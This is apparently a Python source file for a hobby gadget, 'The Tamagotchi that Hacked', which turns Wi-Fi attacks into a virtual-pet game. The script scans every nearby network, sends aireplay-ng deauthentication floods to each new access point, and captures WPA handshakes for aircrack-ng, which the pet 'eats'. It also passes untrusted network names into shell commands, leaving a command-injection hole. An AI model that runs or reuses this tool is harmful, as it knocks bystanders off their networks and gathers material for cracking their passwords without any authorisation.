# The Tamagotchi that Hacked
# by Samuel Lomas                                      

###### Imports ######

import os                  # To interface with bash
import time as t           # for interval-based functions
import csv as c            # To read CSV files
import threading as th     # multithreading
import subprocess as s     # get output of commands
import datetime as dt      # for finding the time x seconds ago
import signal              # for handling keyboard interrupts
import sys

from ui import __uirun__        # Load UI file

###### Globals ######

workingDir = os.getcwd()        # Get Current working directory
interface = "wlp2s0"
moninterface = "wlp2s0mon"
LOGGING = True                  # disable to remove logging
R = '\033[91m'                  # Red Text
B = '\033[94m'                  # Blue Text
G = '\033[92m'                  # Green Text
W = '\033[0m'                   # White Text
currScan = []                   # Networks that are currently being scanned
global HUNGER
HUNGER = 50                      # Need hunger to be a global so it can be saved in a separate thread
global SHAKES
SHAKES = 0
###### Common Functions ######

def log(phrase): #replaces print function, end user should not be able to see the terminal anyway.
    if (LOGGING == True): #printing also uses precious CPU space, so having it easily disabled is a benefit.
        print(R + "[ LOG ] - " + B + str(phrase) + W) #prints out a formatted log message

def makearr(a): #Makes array of a CSV file
    r = []
    for row in a:
        r.append(row)
    return r

def signal_handler(sig, frame):
    log('You pressed Ctrl+C!')
    log('Goodbye! :)')
    discard = s.Popen(['airmon-ng stop ' + moninterface + "&& pkill -f aireplay-ng && pkill -f airodump-ng"],
            cwd=workingDir,
            shell=True,
            stdout=s.DEVNULL,
            stderr=s.STDOUT) # Set Wireless interface to managed mode and close all running subprocesses
    
    sys.exit(0)    
def getSave():
    f = open("save.csv", "r")                               # open save.csv, if it doesn't exist this will call an exception
    f_read = c.reader(f, delimiter=',')
    rows = makearr(f_read)[0]
    f.close()
    for i in range(0, len(rows)):
        rows[i] = int(rows[i])   
    return rows                                             # return 2D array of csv

###### Network Sniffing Thread ######

def monThread(moninterface, network):
    procName = str(network[3]).replace(" ", "")
    command = "airodump-ng -c " + network[2].replace(" ", "") + " --bssid " + network[0] + " -w scans/" + procName + " --output-format pcap " + moninterface

    fincommand = 'bash -c "exec -a ' + procName  + " " + command + '"'
    #log(fincommand)
    discard = s.Popen(fincommand,
            cwd=workingDir,
            shell=True,
            stdout=s.DEVNULL,
            stderr=s.STDOUT) # starts monitoring a network while uploading to file
    t.sleep(3)

    deauthcomm = "aireplay-ng -0 20 -a " + network[0] + " -D " + moninterface #compile string for deauth

    deauth = s.Popen(deauthcomm,
            cwd=workingDir,
            shell=True,
            stdout=s.DEVNULL,
            stderr=s.STDOUT) # Deauth said network for 50 frames

###### Analysis Thread ######

def analysisThread():
    pastEntarr = []
    global HUNGER
    global SHAKES
    while True:
        entarr = []
        t.sleep(5)
        aircrackout = s.run('yes |  aircrack-ng scans/*.cap', stdout=s.PIPE, cwd=workingDir, shell=True).stdout.decode('utf-8') # Poll output from aircrack
        messyaircrackarr = [y for y in (x.strip() for x in aircrackout.splitlines()) if y] #Turns multiline string into list
        aircrackarr = []
        
        for i in range(0, len(messyaircrackarr)):
            if messyaircrackarr[i][0].isdigit():
               aircrackarr += ["".join(messyaircrackarr[i])] #Refine list to only strings starting with a number
        
        for i in range(0, len(aircrackarr)):
            e = aircrackarr[i].split()
            if "handshake)" in e:
                num = int((e[e.index("handshake)")-1]).replace("(", "")) # trim down str and turn into int
                ent = [e[1], num] # Add BSSID and num of handshakes to arr
                entarr += [ent] 
            elif "handshake," in e:
                num = int((e[e.index("handshake,")-1]).replace("(", ""))
                ent = [e[1], num]
                entarr += [ent]   # Get key variations of handshakes
        
        log(G + " - - - ANALYSIS - - - ")
        for i in range(0, len(entarr)):
            log(entarr[i])

        for i in range(0, len(entarr)): # if there is a new log, add whatever values it is imported with to the strings
            if (entarr[i] in pastEntarr) == False:
                HUNGER += entarr[i][1] * 5
                SHAKES += entarr[i][1]

        for i in range(0, len(entarr)): # agony
            for j in range(0, len(pastEntarr)):
                if entarr[i][0] == pastEntarr[j][0]:
                    if entarr[i][1] != pastEntarr[j][1]: # If there is a difference in two matching BSSIDS
                        log("difference")
                        diff = entarr[i][1] - pastEntarr[j][1]
                        HUNGER += (diff) * 5  #add the difference between the old and new values multiplied by 5
                        SHAKES += diff
        pastEntarr = entarr

###### Hunger Function ######

def hungerThread(): #Thread running to decrease the hunger by 1 every x seconds
    interval = 30
    while True:
        t.sleep(interval)
        global HUNGER
        if HUNGER > 0:
            HUNGER -= 1

###### Initialization ######

signal.signal(signal.SIGINT, signal_handler) # To gracefully shut the program down upon ctrl-c

log("Hello World!")
log("Setting to monitor mode...")
discard = s.Popen(['airmon-ng start ' + interface],
             cwd=workingDir,
             shell=True,
             stdout=s.DEVNULL,
             stderr=s.STDOUT) # Set Wireless interface to monitor mode

t.sleep(1)

if os.path.isdir('scans') == False: # make sure scans folder exists - if it doesn't, make a new one
    os.system("mkdir scans")

os.system("rm -rfv scans/*") #delete contents of scan folder

try:
    os.system("rm -f airodump_output-01.csv") #prevents airodump from creating a new file which can be a nuisance
    log('Deleted past log')
except:
    log("error in deleting past log!")

log("Done!")
try:
    log("Attempting to read save.csv")
    f = open("save.csv", "r")                               # open save.csv, if it doesn't exist this will call an exception
    log("save.csv exists!\nChecking validity...")
    f_read = c.reader(f, delimiter=',')
    rows = makearr(f_read)                                  # Create an array of CSV file
    log(rows)
    if rows == []:
        raise Exception                                   # If file is empty raise exception
    else:
        HUNGER = int(rows[0][0])
        SHAKES = int(rows[0][3])
    f.close()
    log("save.csv is valid!")
except:
    log("save.csv does not exist or is invalid!\nCreating new save.csv ...")
    j = open("save.csv","w")                                # create save.csv
    f_write = c.writer(j, delimiter=',')                    # Create default save
    
    f_write.writerow([50,0,0,0])                           # Hunger, Currently Scanning APs, Total Scanned APs and Total stolen handshakes
    j.close()

log("Starting UI thread!")
th.Thread(target=__uirun__).start()                         # Run the UI in separate thread
th.Thread(target=hungerThread).start()                      # Run the Hunger thread
th.Thread(target=analysisThread).start()                     # Run the handshake analysis in a separate thread
###### Wi-Fi Scanning loop ######

def scanThread(moninterface):
    discard = s.Popen(['airodump-ng -w airodump_output --output-format csv -I 1 -u 1 ' + moninterface], 
            cwd=workingDir,
            shell=True, 
            stdout=s.DEVNULL, 
            stderr=s.STDOUT) # Scans for networks and saves to file    

def findnewscans(pastcurrScan): # Retrieve list of newly added networks to start scanning
    log(R + " - - - N E W  S C A N S - - - ")
    newScans = []
    for i in range(0, len(currScan)): # Iterate through the latest scan
        found = False
        for j in range(0, len(pastcurrScan)): # Look for BSSID in list of previous scans to find if it is already being scanned
            if currScan[i][0] == pastcurrScan[j][0]:
                found = True
        if found == False:
            newScans += [currScan[i]] # if the network is not found, add it to the list of networks to start scanning
    for i in range(0, len(newScans)):
        log(newScans[i])
    return newScans

def findmissingscans(pastcurrScan): # Retrieve list of missing networks to stop scanning
    log(R + " - - - R E M O V E D  S C A N S - - - ")
    remScans = []
    for i in range(0, len(pastcurrScan)): # Iterate through the previous scan 
        found = False
        for j in range(0, len(currScan)): # look for BSSID of i by iterating through list of values in the new scan
            if pastcurrScan[i][0] == currScan[j][0]:
                found = True
        if found == False:
            remScans += [pastcurrScan[i]] # if the network is not found, add it to the list of missing networks
    for i in range(0, len(remScans)):
        log(remScans[i])
    return remScans

def cull(wifilist): # Refine information in wifi list array
    culledList = [] # Create new empty array
    # log(wifilist)
    for i in range(2, len(wifilist)): #iterate from 2 to end of array
        if wifilist[i] == []: # end loop after iterating through all scanned networks
            break
        if wifilist[i][13] != ' ': #If the network has an ESSID
            culledList.append([wifilist[i][0], wifilist[i][2], wifilist[i][3], wifilist[i][13]]) # appends the BSSID, last time seen, channel and ESSID
    log("Array culled!")
    return culledList

def getTimes(): # Make an array of the times i seconds ago, for reference in the scanning
    timearr = []
    for i in range(7):
        x = dt.datetime.now() - dt.timedelta(seconds = i)
        timearr.append(" " + x.strftime("%Y") + "-" + x.strftime("%m") + "-" + x.strftime("%d") + " " + x.strftime("%H") + ":" + x.strftime("%M") + ":" + x.strftime("%S"))
    return timearr

log("Starting Scanning Thread!")
th.Thread(target=scanThread, args=(moninterface,)).start() # Start a scanning thread

t.sleep(1) # Wait a second to get thread started

while True:
    out = open((workingDir + '/airodump_output-01.csv'), 'r') # import log file
    
    ## Time Formatting
    
    timearr = getTimes()
    #log(R + "TIMES:\n" + G + str(timearr))

    ## Import csv and make 2D array
    
    out_read = c.reader(out, delimiter=',') # Convert it to CSV
    wifiList = makearr(out_read) # Convert CSV to 2D array
    wifiList = cull(wifiList)
    
    ## Check for networks that are valid to scan
    pastcurrScan = currScan
    currScan = []

    for i in range(0, len(wifiList)):
        found = False
        for j in range(0, len(currScan)):
            if wifiList[i][3] == currScan[j][3]:
                found = True

        if (wifiList[i][1] in timearr) and (found == False):
            currScan += [wifiList[i]] 

    log(R + " - - - C U R R E N T  S C A N S - - - ")
    for i in range(0, len(currScan)):
        log(currScan[i])  
    rows = getSave()
    rows[1] = len(currScan)                                     # Update currently scanning
    if HUNGER > 100:
        HUNGER = 100
    rows[0] = HUNGER                                            # also update the hunger while we're at it
    rows[3] = SHAKES                                            # Maybe even the total handshakes too
    j = open("save.csv","w")                               
    f_write = c.writer(j, delimiter=',')                   
    f_write.writerow(rows)                                      # Write
    j.close()
    
    
    ## Find new networks to scan
    
    newScans = findnewscans(pastcurrScan)
    for i in range(0, len(newScans)):
        monThread(moninterface,  newScans[i])
        rows = getSave()                                        # Increase total networks scanned by 1
        rows[2] += 1
        j = open("save.csv","w")                               
        f_write = c.writer(j, delimiter=',')                    
        f_write.writerow(rows)                                  # Write new save to save.csv
        j.close()
    
        
    ## Find missing values to stop scanning

    remScans = findmissingscans(pastcurrScan)
    for i in range(0, len(remScans)):
        discard = s.Popen(['pkill -f ' + remScans[i][3].replace(" ", "")],
                cwd=workingDir,
                shell=True,
                stdout=s.DEVNULL,
                stderr=s.STDOUT)
    
    
    out.close()
    t.sleep(3)
